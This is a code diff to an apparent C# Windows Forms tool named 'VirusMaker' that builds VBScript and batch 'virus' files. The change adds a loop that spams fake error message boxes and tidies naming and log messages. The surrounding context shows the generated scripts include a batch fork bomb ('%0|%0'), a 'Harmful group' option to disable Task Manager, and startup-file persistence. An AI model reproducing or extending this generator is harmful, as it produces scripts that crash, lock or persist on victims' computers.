@@ -23,6 +23,7 @@ namespace VirusMaker
 
         // GLOBALS
         string newLine = Environment.NewLine;
+        bool defaultNameUsed = false;
 
         // SAVE + DELETE BUTTONS
         private void saveLocationBtn_Click(object sender, EventArgs e)
@@ -159,6 +160,32 @@ namespace VirusMaker
                             + "start %0" + newLine
                             + "%0|%0" + newLine;
                     }
+                    if (spamErrorTitle_Input.Text.Trim().Length > 0 || spamErrorMsg_Input.Text.Trim().Length > 0)
+                    {
+                        if (spamErrorTitle_Input.Text.Trim().Length > 0 && spamErrorMsg_Input.Text.Trim().Length > 0)
+                        {
+                            string spamErrorTitle = spamErrorTitle_Input.Text;
+                            string spamErrorMsg = spamErrorMsg_Input.Text;
+
+                            vbsContentsMain += "'--Spam with error message--" + newLine
+                                + "do" + newLine
+                                + "x=msgbox(\"" + spamErrorMsg + "\" ,16, \"" + spamErrorTitle + "\")" + newLine
+                                + "msgCount += 1" + newLine
+                                + "loop until msgCount = 20" + newLine + newLine; // set limit of message boxes to 20
+                        }
+                        else if (spamErrorTitle_Input.Text.Trim().Length == 0)
+                        {
+                            MessageBox.Show("You are missing a title for the fake error messages.");
+                            spamErrorTitle_Input.Select();
+                            return; // breaks event if title missing
+                        }
+                        else if (spamErrorMsg_Input.Text.Trim().Length == 0)
+                        {
+                            MessageBox.Show("You are missing a message for the fake error messages.");
+                            spamErrorMsg_Input.Select();
+                            return;
+                        }
+                    }
 
                     // Harmful group
                     if (disableTaskMng_CB.Checked)
@@ -214,11 +241,17 @@ namespace VirusMaker
 
                     if (virusName.Text.Trim().Length == 0 )
                     {
-                        DialogResult result = MessageBox.Show("The virus name field is blank, do you wan the default name to be used?", "Virus Name Invalid", MessageBoxButtons.YesNo, MessageBoxIcon.Warning);
+                        DialogResult result = MessageBox.Show("The virus name field is blank, do you want the default name to be used?", "Virus Name Invalid", MessageBoxButtons.YesNo, MessageBoxIcon.Warning);
                         if (result == DialogResult.Yes)
                         {
                             vbsSavePath += "myVirus.vbs";
                             batchSavePath += "myVirus_extra.bat";
+                            defaultNameUsed = true;
+                        }
+                        else if (result == DialogResult.No)
+                        {
+                            virusName.Select();
+                            return;
                         }
                     }
                     else if (virusName.Text.Trim().Length > 0)
@@ -262,7 +295,14 @@ namespace VirusMaker
                     }
 
                     MessageBox.Show("Virus Successfully created at:" + newLine + virusMakerFolder, "Operation Complete", MessageBoxButtons.OK, MessageBoxIcon.Information);
-                    msgLog.Text += virusName.Text + " successfully created.";
+                    if (defaultNameUsed) // adjust msgLog depending on defualtNameUsed
+                    {
+                        msgLog.Text += "Your virus was successfully created." + newLine;
+                    }
+                    else if (defaultNameUsed == false)
+                    {
+                        msgLog.Text += "'" + virusName.Text + "' successfully created." + newLine;
+                    }
                 }
                 catch (Exception ex) // catch for overall button code
                 {
@@ -275,7 +315,6 @@ namespace VirusMaker
 
         // Delete startup files remove shortcut
         DeleteStartupDialog deleteStartupWindow = new DeleteStartupDialog();
-
         private void MainForm_KeyDown(object sender, KeyEventArgs e)
         {
             if (e.KeyCode == Keys.D && e.Modifiers == (Keys.Control))
